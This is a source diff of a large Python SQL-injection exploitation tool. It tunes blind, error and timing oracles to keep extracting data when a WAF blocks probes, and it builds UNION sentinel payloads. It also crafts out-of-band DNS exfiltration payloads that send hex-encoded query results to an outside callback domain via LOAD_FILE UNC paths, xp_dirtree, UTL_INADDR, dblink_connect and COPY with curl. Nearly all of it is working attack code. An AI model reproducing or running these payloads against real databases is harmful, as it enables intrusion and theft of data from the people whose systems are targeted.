@@ -47853,10 +47853,29 @@ class Enumerator:
         _eval_fn = None
         _oracle_name = ""
         
-        #  Feature 1: Conditional Error Oracle (immune to timing/body jitter) 
+        #  Feature 1: Conditional Error Oracle (immune to timing/body jitter)
         if hasattr(self, "_error_oracle") and self._error_oracle and self._error_oracle._working_template:
             _eval_fn = self._error_oracle.evaluate
             _oracle_name = "error_oracle"
+            # FIX-CEO-BODY-SIZE-REVALIDATE: body-size oracle is calibrated on constant
+            # expressions (1=1/1=2) but during extraction the WAF may block all probes
+            # uniformly (every extraction probe contains SUBSTRING/ASCII which WAFs flag).
+            # Re-validate with known-true and known-false before committing to this oracle.
+            # Cost: 2 HTTP requests; prevents hundreds of wasted requests yielding garbage.
+            _eo = self._error_oracle
+            if _eo._body_size_oracle:
+                try:
+                    _rv_true = await _eo.evaluate("1=1")
+                    _rv_false = await _eo.evaluate("1=2")
+                    if _rv_true is not True or _rv_false is not False:
+                        LOG.warning(
+                            "[_extract_str] error_oracle body-size re-validation failed "
+                            "(1=1→%r, 1=2→%r) — WAF blocking extraction uniformly; "
+                            "discarding body-size oracle", _rv_true, _rv_false)
+                        _eval_fn = None
+                        _oracle_name = ""
+                except Exception:
+                    pass
         
         # Fall back to MSE boolean oracle
         if not _eval_fn and hasattr(self, "_mse_instance") and self._mse_instance:
@@ -48217,6 +48236,19 @@ class Enumerator:
         # or 0 (if the oracle returns False for equality on a non-existent value).
         _ext_max_pre = int(getattr(getattr(self, 'config', None), 'extraction_max_len', 512) or 512)
         _ext_max_pre = max(_ext_max_pre, 256)
+        # FIX-NO-FIELD-MAX-LEN: apply a per-field sanity cap so a broken oracle
+        # (e.g. body-size mode returning True for all WAF-blocked extraction probes)
+        # cannot converge to an absurd length (466, 486) and drive hundreds of
+        # wasted character-extraction requests.  Real DB values have known limits.
+        _FIELD_MAX_LEN = {
+            "version": 150, "current_user": 64, "user": 64,
+            "database": 128, "current_db": 128, "hostname": 128,
+            "datadir": 256, "basedir": 256,
+        }
+        _cur_field = getattr(self, '_current_field', None) or ""
+        _field_cap = _FIELD_MAX_LEN.get(_cur_field.lower(), 0)
+        if _field_cap and _field_cap < _ext_max_pre:
+            _ext_max_pre = _field_cap
         low, high = 0, _ext_max_pre
         _bs_iter = 0  # binary-search iteration counter for yield points
         while low <= high:
@@ -48282,6 +48314,24 @@ class Enumerator:
             print(f"[!] [Extract] Length={_length} hit cap={_ext_max} "
                   "(value may be truncated — raise --max-len if needed)", flush=True)
         _length = min(_length, _ext_max)
+        # FIX-NO-FIELD-MAX-LEN (sanity abort): if length still exceeds the
+        # field-specific reasonable maximum, the oracle is malfunctioning (e.g.
+        # body-size mode returning True for all WAF-blocked extraction probes).
+        # Abort early rather than extracting hundreds of garbage chars.
+        _FIELD_REASONABLE_MAX = {
+            "version": 150, "current_user": 64, "user": 64,
+            "database": 128, "current_db": 128, "hostname": 128,
+        }
+        _reasonable_max = _FIELD_REASONABLE_MAX.get((_cur_field or "").lower(), 0)
+        if _reasonable_max and _length > _reasonable_max:
+            LOG.warning(
+                "[_extract_str] Length=%d exceeds reasonable maximum=%d for field %r — "
+                "oracle malfunction suspected (body-size mode on uniformly WAF-blocked target?); "
+                "aborting extraction to prevent garbage output",
+                _length, _reasonable_max, _cur_field)
+            print(f"[!] [Extract] Length={_length} exceeds field maximum={_reasonable_max}"
+                  f" for {_cur_field!r} — oracle likely broken; aborting", flush=True)
+            return ""
         print(f"[+] [Extract] Length={_length} (oracle={_oracle_name})", flush=True)
 
         # BUG-R7-C: Track best partial result across all extraction strategies so
@@ -55193,7 +55243,12 @@ class Scanner:
                 _bl_pct = _bl_diff / _bl_max
                 # Minimum thresholds: 500B absolute OR 2% relative
                 # On 135KB pages, 200B difference is dynamic noise (timestamps, ads)
-                if _bl_pct >= 0.10 or (_bl_max < 5000 and _bl_diff >= 50):
+                # FIX-BOOL-WAF-BLOCKED: if BOTH true and false probes are WAF-blocked
+                # (4xx), the body-length difference is just WAF page size variation —
+                # NOT a SQL injection signal.  Guard before accepting body-diff oracle.
+                _both_waf_blocked = (_true_status is not None and _false_status is not None
+                                     and _true_status >= 400 and _false_status >= 400)
+                if (_bl_pct >= 0.10 or (_bl_max < 5000 and _bl_diff >= 50)) and not _both_waf_blocked:
                     _boolean_oracle = True
                     _bool_true_len = len(_true_body)
                     _bool_false_len = len(_false_body)
@@ -55442,6 +55497,8 @@ class Scanner:
                 except Exception as _stat_err:
                     LOG.debug("[StatTiming] Statistical analysis error: %s", _stat_err)
             
+            _waitfor_m = None
+            _sleep_m = None
             if not _skip_templates:
                 # Try ARITHMETIC template: modify sleep argument instead of adding WHERE.
                 # pg_sleep((cond)::int * 5)  sleeps 5 if TRUE, 0 if FALSE
@@ -55456,12 +55513,12 @@ class Scanner:
                 # rewrite block (if _sleep_m: ...) was permanently dead for MSSQL.
                 # Fix: match WAITFOR DELAY with a dedicated pattern that captures
                 # the quoted time value, then feed it into the arithmetic block.
-                _waitfor_m = None
-                if not _skip_templates:
-                    _waitfor_m = _re.search(
-                        r"WAITFOR\s+DELAY\s+['\"](\d+:\d+:[\d.]+)['\"]",
-                        _body, _re.I)
-                _sleep_m = _re.search(r'(pg_sleep|SLEEP|sleep|DBMS_SESSION\.SLEEP|DBMS_LOCK\.SLEEP)\s*\(\s*([^)]+)\)', _body, _re.I) if not _skip_templates else None
+                # FIX-WAITFOR-UNBOUND: _waitfor_m/_sleep_m initialised above (before this
+                # block) so they are always defined even when _skip_templates=True.
+                _waitfor_m = _re.search(
+                    r"WAITFOR\s+DELAY\s+['\"](\d+:\d+:[\d.]+)['\"]",
+                    _body, _re.I)
+                _sleep_m = _re.search(r'(pg_sleep|SLEEP|sleep|DBMS_SESSION\.SLEEP|DBMS_LOCK\.SLEEP)\s*\(\s*([^)]+)\)', _body, _re.I)
             _genseries_m = _re.search(r'generate_series\s*\(\s*\d+\s*,\s*(\d+)', _body, _re.I) if not _skip_templates else None
 
             _arith_ok = False
@@ -106860,10 +106917,15 @@ class TechniqueCascadeEngine:
                 # sentinel probes.  The original always prepended "'" (string prefix)
                 # which produces a syntax error for numeric injection (WHERE id=INPUT).
                 # Now build both variants; use whichever gets the sentinel reflected.
+                # FIX-UNION-SENTINEL-ORACLE-FROM-DUAL: Oracle requires FROM DUAL in
+                # standalone SELECT expressions; without it ORA-00923 fires and the
+                # sentinel is never reflected → all Oracle UNION injections miss the
+                # strongest PCV confirmation.  Append FROM DUAL for Oracle only.
+                _from_dual = " FROM DUAL" if dbms == "Oracle" else ""
                 _sfx_str = ("' UNION ALL SELECT '" + _sentinel_val + "'"
-                            + ("," + _nulls if _nulls else "") + "-- -")
+                            + ("," + _nulls if _nulls else "") + _from_dual + "-- -")
                 _sfx_num = (" UNION ALL SELECT '" + _sentinel_val + "'"
-                            + ("," + _nulls if _nulls else "") + "-- -")
+                            + ("," + _nulls if _nulls else "") + _from_dual + "-- -")
                 _sfp, _, _, _ = await _pcv_send(_sfx_str)
                 # If string-context probe got blocked or didn't reflect, try numeric
                 if not _validate_response(_sfp, func_name="waf_block_check"): pass  # BUG-FIX-SYNTAX: continue→pass (not inside loop; fallthrough to numeric variant below)
@@ -107500,7 +107562,28 @@ class TechniqueCascadeEngine:
                     "extractvalue(",
                     "division by zero",
                 ],
-            }.get(dbms, ["you have an error in your sql syntax", "error 1064", "sqlstate["])
+            # FIX-CHECKC-UNKNOWN-DBMS: the old fallback contained only MySQL-format patterns.
+            # When dbms="" (timing-first detection fires before DBMS fingerprinting),
+            # Check C sends MySQL error canaries to MSSQL/PostgreSQL/Oracle/SQLite targets
+            # and then matches against MySQL-only patterns — always fails.  Union of all
+            # DBMS patterns below catches the actual error message regardless of DBMS.
+            }.get(dbms, [
+                # MySQL / MariaDB
+                "you have an error in your sql syntax", "error 1064", "sqlstate[",
+                "xpath syntax error", "updatexml(", "extractvalue(",
+                # PostgreSQL
+                "division by zero", "invalid input syntax for type",
+                "syntax error at or near", "pg_query()", "pg_exec()",
+                # MSSQL
+                "incorrect syntax near", "unclosed quotation mark",
+                "microsoft", "[microsoft]", "[odbc",
+                # Oracle
+                "ora-", "oracle error", "quoted string not properly terminated",
+                # SQLite
+                "no such table", "no such column", "sqlite_error", "operationalerror",
+                # Generic
+                "syntax error",
+            ])
             
             # Double error confirmation: collect matches from ALL fallbacks
             _all_c_matches = []  # (payload_name, matched_pattern, status_code)
@@ -112869,7 +112952,15 @@ class TechniqueCascadeEngine:
             return [template]
 
         elif tech == "O":
-            oob_domain = getattr(self.config, "oob_server", "sqr.oast.pro") or "sqr.oast.pro"
+            # FIX-OOB-URL-AS-DNS: config.oob_server is the REST API URL (e.g.
+            # "https://sqr.oast.pro:8080").  Using it verbatim as {oob} in SQL
+            # produces invalid DNS hostnames — no callbacks ever arrive.
+            # Prefer _oob_registered_domain; fallback strips URL scheme.
+            _oob_raw_o = getattr(self.config, "oob_server", "sqr.oast.pro") or "sqr.oast.pro"
+            _oob_reg_o = getattr(self.config, "_oob_registered_domain", None)
+            oob_domain = (_oob_reg_o if _oob_reg_o else
+                          (_oob_raw_o.split("://", 1)[1].split("/")[0]
+                           if "://" in _oob_raw_o else _oob_raw_o))
             print(f"[*] OOB payload #{self._total_reqs} fired  check {oob_domain} for DNS callback", flush=True)
             return [template.replace("{expr}", e).replace("{oob}", oob_domain) for e in exprs[:3]]
 
@@ -112886,7 +112977,12 @@ class TechniqueCascadeEngine:
             ]
 
         elif tech == "DS":
-            oob_domain = getattr(self.config, "oob_server", "sqr.oast.pro") or "sqr.oast.pro"
+            # FIX-OOB-URL-AS-DNS: same URL-scheme stripping as tech=="O" above.
+            _oob_raw_ds = getattr(self.config, "oob_server", "sqr.oast.pro") or "sqr.oast.pro"
+            _oob_reg_ds = getattr(self.config, "_oob_registered_domain", None)
+            oob_domain = (_oob_reg_ds if _oob_reg_ds else
+                          (_oob_raw_ds.split("://", 1)[1].split("/")[0]
+                           if "://" in _oob_raw_ds else _oob_raw_ds))
             return [template.replace("{expr}", e).replace("{oob}", oob_domain) for e in exprs[:3]]
 
         return [template]
@@ -129031,17 +129127,26 @@ class SafeModeVerifier:
         waf_challenge = False
         try:
             import random as _wc_rand
-            _wc_nonce = f"_smvnonce={_wc_rand.randint(100000, 999999)}"
-            _wc_url = url + ("&" if "?" in url else "?") + _wc_nonce
-            fp   = await engine.send(method, _wc_url)
-            body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction").lower()
-            # Use multi-word phrases to avoid false positives on normal pages
-            # (single words like "challenge" or "your browser" match too broadly)
-            waf_challenge = any(kw in body for kw in
-                ("captcha","i am not a robot","cf-browser-verification",
-                 "just a moment","checking your browser","verify you are human",
-                 "ddos protection by","access denied by",
-                 "please enable cookies","browser verification"))
+            # FIX-WAF-CHALLENGE-SINGLE-PROBE: one request hits CDN cold-edge and
+            # returns a JS-challenge page while warm-edge returns the real page on
+            # the next run.  Use 3 cache-busted probes and require majority (≥2)
+            # to avoid a single transient edge-node challenge flipping the oracle.
+            _waf_kws = ("captcha","i am not a robot","cf-browser-verification",
+                        "just a moment","checking your browser","verify you are human",
+                        "ddos protection by","access denied by",
+                        "please enable cookies","browser verification")
+            _wc_hits = 0
+            for _wc_attempt in range(3):
+                _wc_nonce = f"_smvnonce={_wc_rand.randint(100000, 999999)}"
+                _wc_url = url + ("&" if "?" in url else "?") + _wc_nonce
+                _wc_fp = await engine.send(method, _wc_url)
+                _wc_body = _safe_decode_body(_wc_fp, encoding="utf-8", errors="replace", func_name="extraction").lower()
+                if any(kw in _wc_body for kw in _waf_kws):
+                    _wc_hits += 1
+                if _wc_attempt < 2:
+                    import asyncio as _wc_asyncio
+                    await _wc_asyncio.sleep(0.2)
+            waf_challenge = _wc_hits >= 2
         except Exception as _sqr_e:
             LOG.debug("Suppressed: %s", _sqr_e)
         if waf_challenge:
@@ -129239,7 +129344,12 @@ class SafeModeVerifier:
                         _diff_len_sum += len_d
                         if stat_d:
                             _diff_stat_sum = True
-                        if emd > 0.010 or len_d > 150 or stat_d:
+                        # FIX-EMD-THRESHOLD: 0.010 is at the noise floor for targets
+                        # with server-side token rotation (CSRF nonces, ad IDs that
+                        # survive ResponseNormaliser).  Observed emd=0.0130 oscillates
+                        # above/below 0.010 between runs, flipping oracle mode.
+                        # Raised to 0.018 to sit above typical normaliser-resistant noise.
+                        if emd > 0.018 or len_d > 150 or stat_d:
                             _diff_rounds += 1
                         await asyncio.sleep(0.15)
 
@@ -134674,7 +134784,10 @@ class SideChannelExtractor:
         _methods = []
         if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
             # PostgreSQL hex: encode(expr::bytea, 'hex')
-            _hex = "encode((" + expr + ")::bytea,$$hex$$)"  # BUG-PGSQL-HEX-FSTRING FIX
+            # FIX-OOB-DNS-LABEL-LIMIT: RFC 1035 caps DNS labels at 63 chars.
+            # Hex-encoding doubles byte count, so >31 bytes produces an over-length
+            # label that resolvers silently reject.  Truncate to 31 bytes at SQL level.
+            _hex = "encode((SUBSTRING((" + expr + "),1,31))::bytea,$$hex$$)"  # BUG-PGSQL-HEX-FSTRING FIX
             # BUG-PGSQL-NONSTACK-EXFIL FIX: For non-stacked detections (B/E/T),
             # self._prefix = "'  " so "{prefix}SELECT dblink_connect_u(...)" becomes
             # "'  SELECT dblink_connect_u(...)" — INVALID SQL in a WHERE clause.
@@ -134693,16 +134806,26 @@ class SideChannelExtractor:
                 # Inline AND (SELECT ...) wrapper — mirrors the detection payload style
                 _pg_dblink_u = f"{self._prefix}AND (SELECT dblink_connect_u({_conn_str})) IS NOT NULL{self._suffix}"
                 _pg_dblink   = f"{self._prefix}AND (SELECT dblink_connect({_conn_str})) IS NOT NULL{self._suffix}"
-                _pg_copy_c   = f"{self._prefix}AND 1=1{self._suffix}"  # COPY needs stacked
-                _pg_copy_n   = f"{self._prefix}AND 1=1{self._suffix}"  # COPY needs stacked
+                # COPY-based methods require stacked-query context (semicolon separator).
+                # In non-stacked context there is no real payload to send; skip them
+                # entirely rather than sending a dummy AND 1=1 that never exfiltrates.
+                _pg_copy_c   = None  # populated only when self._stacked is True
+                _pg_copy_n   = None
                 _pg_notify   = f"{self._prefix}AND (SELECT pg_notify($$oob$$, {_hex})) IS NOT NULL{self._suffix}"
+            # FIX-OOB-NONSTACKED-DUMMY: COPY needs stacked-query context.  When not
+            # stacked, the payload was "AND 1=1" — a no-op that never exfiltrates data
+            # but still triggers a DNS-poll attempt (wasting time, no callback arrives).
+            # Now _pg_copy_c/_pg_copy_n are None in non-stacked mode; filter them out.
+            # FIX-OOB-PG-NOTIFY: pg_notify sends a local PostgreSQL LISTEN/NOTIFY event
+            # within the DB cluster only — no network connection, no DNS lookup, no OAST
+            # interaction possible under any circumstances.  Removed from OOB methods.
             _methods = [
                 ("dblink_u",     _pg_dblink_u, "dblink_connect_u DNS (no extension needed)"),
                 ("dblink",       _pg_dblink,   "dblink_connect DNS (needs dblink extension)"),
-                ("copy_curl",    _pg_copy_c,   "COPY+curl HTTP exfil (superuser only)"),
-                ("copy_nslookup",_pg_copy_n,   "COPY+nslookup DNS (superuser only)"),
-                ("pg_notify",    _pg_notify,   "pg_notify (needs listener)"),
             ]
+            if self._stacked and _pg_copy_c is not None:
+                _methods.insert(2, ("copy_curl",     _pg_copy_c, "COPY+curl HTTP exfil (superuser only)"))
+                _methods.insert(3, ("copy_nslookup", _pg_copy_n, "COPY+nslookup DNS (superuser only)"))
         elif self.dbms in ("MySQL", "MariaDB"):
             # BUG-DNS-EXFIL-NONSTACK-CONTEXT FIX: For non-stacked detections (B/E/T),
             # self._prefix = "' " (boolean context), so
@@ -134715,8 +134838,9 @@ class SideChannelExtractor:
             # (can't read the UNC path on Linux). The DNS resolution happens before the
             # return value is evaluated. 0x0=NULL evaluates to UNKNOWN/FALSE (harmless).
             # When stacked, use the normal "{prefix}SELECT LOAD_FILE(...){suffix}".
-            _lf_inner = f"CONCAT(CHAR(92),CHAR(92),LOWER(HEX(({expr}))),CHAR(46),{_q(_cb)},CHAR(92),CHAR(120))"
-            _lf_alt   = f"CONCAT(CHAR(92,92),LOWER(HEX(({expr}))),CHAR(46),{_q(_cb)},CHAR(92,120))"
+            # FIX-OOB-DNS-LABEL-LIMIT: limit hex to 31 bytes (62 hex chars ≤ 63 label max)
+            _lf_inner = f"CONCAT(CHAR(92),CHAR(92),LOWER(HEX(SUBSTR(({expr}),1,31))),CHAR(46),{_q(_cb)},CHAR(92),CHAR(120))"
+            _lf_alt   = f"CONCAT(CHAR(92,92),LOWER(HEX(SUBSTR(({expr}),1,31))),CHAR(46),{_q(_cb)},CHAR(92,120))"
             if self._stacked:
                 _lf1 = f"{self._prefix}SELECT LOAD_FILE({_lf_inner}){self._suffix}"
                 _lf2 = f"{self._prefix}SELECT LOAD_FILE({_lf_alt}){self._suffix}"
@@ -134733,7 +134857,8 @@ class SideChannelExtractor:
             # "' DECLARE @h ..." is invalid SQL in a WHERE clause.
             # When stacked: DECLARE...SET...EXEC works correctly.
             # When not stacked: use fn_trace_gettable as an inline expression.
-            _hx_ms = f"LOWER(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),({expr})),2))"
+            # FIX-OOB-DNS-LABEL-LIMIT: limit hex to 31 bytes (62 hex chars ≤ 63 label max)
+            _hx_ms = f"LOWER(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),SUBSTRING(({expr}),1,31)),2))"
             _unc_ms = f"CHAR(92)+CHAR(92)+{_hx_ms}+CHAR(46)+{_q(_cb)}+CHAR(92)+CHAR(120)"
             if self._stacked:
                 _ms_dt = f"{self._prefix}DECLARE @h VARCHAR(999);SET @h={_unc_ms};EXEC master..xp_dirtree @h{self._suffix}"
@@ -134759,7 +134884,8 @@ class SideChannelExtractor:
             #   "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS(hex||'.domain') FROM DUAL) IS NOT NULL-- -"
             # UTL_INADDR fires DNS resolution as side effect even if it raises ORA-29257.
             # For stacked context, use the standalone SELECT form.
-            _ora_hx   = f"LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(({expr}))))||{_q('.' + _cb)}"
+            # FIX-OOB-DNS-LABEL-LIMIT: limit hex to 31 bytes (62 hex chars ≤ 63 label max)
+            _ora_hx   = f"LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(SUBSTR(({expr}),1,31))))||{_q('.' + _cb)}"
             _ora_http = f"{_q('http://')}||({expr})||{_q('.' + _cb + '/')}"
             if self._stacked:
                 _ora_ui = f"{self._prefix}SELECT UTL_INADDR.GET_HOST_ADDRESS({_ora_hx}) FROM dual{self._suffix}"
@@ -134858,10 +134984,16 @@ class SideChannelExtractor:
         # the DNS callback is already at the OAST server. Poll regardless.
         # Only skip if NO payloads were sent at all.
         _sent_any = len(_methods) > 0
+        # FIX-OOB-POLL-SKIP: dblink/UTL_HTTP resolve DNS BEFORE the TCP connection,
+        # so the OAST callback fires even when the app returns 400/500 quickly
+        # (ECONNREFUSED in <100ms).  The previous guard "and _any_non_blocked" silently
+        # skipped the poll whenever all methods returned error status codes — exactly
+        # the expected outcome for dblink on a non-listening host.  Remove the guard;
+        # poll whenever any payload was sent, regardless of response status codes.
         if not _any_non_blocked and _sent_any:
-            print("[SideChannel]  All OOB methods blocked (status=400/403)"
-                  " — skipping DNS poll (no payload reached server)", flush=True)
-        if _oob_server and _sent_any and _any_non_blocked:
+            print("[SideChannel]  All OOB methods returned error/blocked status codes"
+                  " — polling anyway (DNS resolves before TCP; callbacks may exist)", flush=True)
+        if _oob_server and _sent_any:
             print("[SideChannel] Polling callback server for DNS interactions (30s)...", flush=True)
             try:
                 _hdrs = {"Authorization": f"Bearer {_oob_token}"} if _oob_token else {}
@@ -137795,27 +137927,64 @@ class ScannerV15(ScannerV14):
             if not first_params:
                 first_params = {"id": ["1"]}
 
-            fp_  = next(iter(first_params))
-            # BUG-V61-FROM-URL-LIST-ORIGINAL FIX (preserved): normalise list/str/other.
-            _fv_raw = first_params.get(fp_, ["1"])
-            if isinstance(_fv_raw, list):
-                fv_ = str(_fv_raw[0]) if _fv_raw else "1"
-            elif isinstance(_fv_raw, str):
-                fv_ = _fv_raw
-            else:
-                fv_ = str(_fv_raw) if _fv_raw is not None else "1"
-            LOG.debug("[SafeVerify] Probing param=%r original=%r (from %s)",
-                      fp_, fv_,
-                      "POST body" if _cfg_data and first_params else "URL params")
-            report = await asyncio.wait_for(
-                self.safe_verifier.verify(engine, method, url,
-                                          getattr(cfg,"data",None),
-                                          fp_, fv_), timeout=20)
+            # FIX-FIRST-PARAM-WRONG: next(iter(first_params)) picks the first dict key
+            # (e.g. "token" in ?token=abc&id=5), which is often a non-injectable CSRF
+            # token.  The verifier probes the wrong param → boolean_capable=False →
+            # oracle degrades to TIMING_ONLY/BLOCKED even on boolean-injectable targets.
+            # Fix: probe ALL parameters (up to 3), take the best oracle mode.
+            _oracle_rank = {
+                OracleMode.FULL: 4, OracleMode.DIFFERENTIAL: 3,
+                OracleMode.TIMING_ONLY: 2, OracleMode.BLOCKED: 1,
+            }
+            report = None
+            _cfg_data_val = getattr(cfg, "data", None)
+            for _fp_try, _fv_raw_try in list(first_params.items())[:3]:
+                if isinstance(_fv_raw_try, list):
+                    _fv_try = str(_fv_raw_try[0]) if _fv_raw_try else "1"
+                elif isinstance(_fv_raw_try, str):
+                    _fv_try = _fv_raw_try
+                else:
+                    _fv_try = str(_fv_raw_try) if _fv_raw_try is not None else "1"
+                LOG.debug("[SafeVerify] Probing param=%r original=%r (from %s)",
+                          _fp_try, _fv_try,
+                          "POST body" if _cfg_data and first_params else "URL params")
+                try:
+                    _cand_report = await asyncio.wait_for(
+                        self.safe_verifier.verify(engine, method, url,
+                                                  _cfg_data_val,
+                                                  _fp_try, _fv_try), timeout=20)
+                except Exception:
+                    _cand_report = None
+                if _cand_report is not None:
+                    if (report is None or
+                            _oracle_rank.get(_cand_report.oracle_mode, 0) >
+                            _oracle_rank.get(report.oracle_mode, 0)):
+                        report = _cand_report
+                    # Short-circuit if we already found FULL oracle
+                    if report.oracle_mode == OracleMode.FULL:
+                        break
+            if report is None:
+                # Absolute fallback — synthesise a minimal report
+                fp_  = next(iter(first_params))
+                _fv_raw = first_params.get(fp_, ["1"])
+                fv_ = str(_fv_raw[0]) if isinstance(_fv_raw, list) and _fv_raw else str(_fv_raw or "1")
+                report = await asyncio.wait_for(
+                    self.safe_verifier.verify(engine, method, url,
+                                              _cfg_data_val, fp_, fv_), timeout=20)
 
-            #  Wire oracle mode into config so all detectors can read it 
+            #  Wire oracle mode into config so all detectors can read it
             # OracleMode.DIFFERENTIAL and TIMING_ONLY are valid scan modes;
             # only OracleMode.BLOCKED is a hard abort (no oracle possible at all).
-            cfg._oracle_mode = report.oracle_mode or OracleMode.FULL
+            cfg._oracle_mode = report.oracle_mode if report else OracleMode.FULL
+            if not cfg._oracle_mode:
+                # FIX-SAFEVERIFY-TIMEOUT: verify() exceeded 20s timeout or failed;
+                # cfg._oracle_mode was never set.  All downstream reads via
+                # getattr(cfg,"_oracle_mode",OracleMode.FULL) would silently return
+                # FULL — but only if code uses the getattr default.  Explicit set here
+                # guarantees determinism and makes the fallback visible in logs.
+                cfg._oracle_mode = OracleMode.FULL
+                LOG.warning("[OracleMode] verify() timed out or returned no report — "
+                            "defaulting to OracleMode.FULL; scan continues with full oracle assumed")
             LOG.info(f"[OracleMode] Selected: {cfg._oracle_mode.value}")
 
             if not report.can_scan:
@@ -150782,6 +150951,15 @@ class ConditionalErrorTypeOracle:
             if abs(err_len - clean_len) > 20:
                 _eo_max = max(err_len, clean_len, 1)
                 _eo_pct = abs(err_len - clean_len) / _eo_max
+                # FIX-NOVEL-BOTH-WAF-BLOCKED: when BOTH the clean probe and the error
+                # probe are blocked by the WAF (both status codes are 4xx), the body-
+                # length difference reflects WAF page size variation (not SQL signal).
+                # Accepting this oracle causes extraction to converge on garbage values
+                # (e.g. length=466, binary garbage chars) because every extraction probe
+                # is also WAF-blocked and all return the larger WAF page.  Skip.
+                _novel_waf_codes = {400, 403, 406, 429, 430, 503}
+                if clean_status in _novel_waf_codes and err_status in _novel_waf_codes:
+                    continue
                 if _eo_pct >= 0.10 or _eo_max < 5000:
                     # BUG-ERRTYPE-ORACLE-WAF-COLLISION FIX: calibration with 1=1/1=2
                     # passes because simple arithmetic isn't WAF-flagged, but extraction
@@ -164169,6 +164347,11 @@ class ConditionalErrorOracle:
         self._body_size_oracle: bool = False
         self._true_oracle_size: int = 0
         self._false_oracle_size: int = 0
+        # FIX-CEO-STATUS-AMBIGUOUS: calibrated HTTP status codes stored alongside
+        # sizes so evaluate() can return None when an extraction probe's status
+        # matches neither calibrated state (WAF blocking for unrelated reasons).
+        self._true_oracle_status: int = 0
+        self._false_oracle_status: int = 0
         # BUG-REQ7-HEADER-CEO FIX: Auto-detect header injection surface.
         # When param starts with "header:" (set by header detection for BH/EH/TH
         # injections), the canonical param name IS the header name.  However the
@@ -164365,6 +164548,8 @@ class ConditionalErrorOracle:
                             self._body_size_oracle = True
                             self._true_oracle_size = _t_body_len
                             self._false_oracle_size = _f_body_len
+                            self._true_oracle_status = _t_st
+                            self._false_oracle_status = _f_st
                             print("[+] [ErrorOracle] Calibrated (body-size mode, WAF-blocked baseline): "
                                   f"true={_t_body_len}B vs false={_f_body_len}B "
                                   f"(ctx={_prefix!r} template: {tpl[:40]}...)", flush=True)
@@ -164380,6 +164565,8 @@ class ConditionalErrorOracle:
                                 self._body_size_oracle = True
                                 self._true_oracle_size = _t_body_len
                                 self._false_oracle_size = _f_body_len
+                                self._true_oracle_status = _t_st
+                                self._false_oracle_status = _f_st
                                 print("[+] [ErrorOracle] Calibrated (body-size mode, WAF-blocked statuses): "
                                       f"true={_t_body_len}B vs false={_f_body_len}B "
                                       f"(ctx={_prefix!r} template: {tpl[:40]}...)", flush=True)
@@ -164402,6 +164589,8 @@ class ConditionalErrorOracle:
                                 self._body_size_oracle = True
                                 self._true_oracle_size = _t_body_len
                                 self._false_oracle_size = _f_body_len
+                                self._true_oracle_status = _t_st
+                                self._false_oracle_status = _f_st
                                 print("[+] [ErrorOracle] Calibrated (asymmetric WAF body-size mode): "
                                       f"true={_t_st}/{_t_body_len}B (WAF-blocked) vs "
                                       f"false={_f_st}/{_f_body_len}B (normal page) "
@@ -164426,6 +164615,8 @@ class ConditionalErrorOracle:
                             self._body_size_oracle = True
                             self._true_oracle_size = _t_body_len
                             self._false_oracle_size = _f_body_len
+                            self._true_oracle_status = _t_st
+                            self._false_oracle_status = _f_st
                             print("[+] [ErrorOracle] Calibrated (body-size mode): "
                                   f"true={_t_body_len}B vs false={_f_body_len}B "
                                   f"(ctx={_prefix!r} template: {tpl[:40]}...)", flush=True)
@@ -164549,9 +164740,22 @@ class ConditionalErrorOracle:
                 # comparison always wins over status-code WAF detection when the oracle
                 # was calibrated to discriminate by body size.
                 if self._body_size_oracle:
+                    _ceo_resp_sc = _get_safe_status_code(_fp)
                     _resp_size = len(getattr(_fp, 'text', '') or '')
                     _to_true = abs(_resp_size - self._true_oracle_size)
                     _to_false = abs(_resp_size - self._false_oracle_size)
+                    # FIX-CEO-STATUS-AMBIGUOUS: if the response status matches neither
+                    # calibrated true-state nor false-state, the WAF is blocking for an
+                    # unrelated reason (different payload syntax, rate-limit, etc.).
+                    # Return None so the binary search aborts rather than mis-classifying
+                    # every extraction probe as True → garbage length/chars.
+                    # Exception: when both calibrated statuses are identical (symmetric
+                    # WAF blocks both), skip this guard since any status == both.
+                    if (self._true_oracle_status != 0 and self._false_oracle_status != 0
+                            and self._true_oracle_status != self._false_oracle_status
+                            and _ceo_resp_sc != self._true_oracle_status
+                            and _ceo_resp_sc != self._false_oracle_status):
+                        return None
                     return _to_true < _to_false
                 if (_ceo_sc in _ceo_waf_codes
                         and _ceo_sc < 500
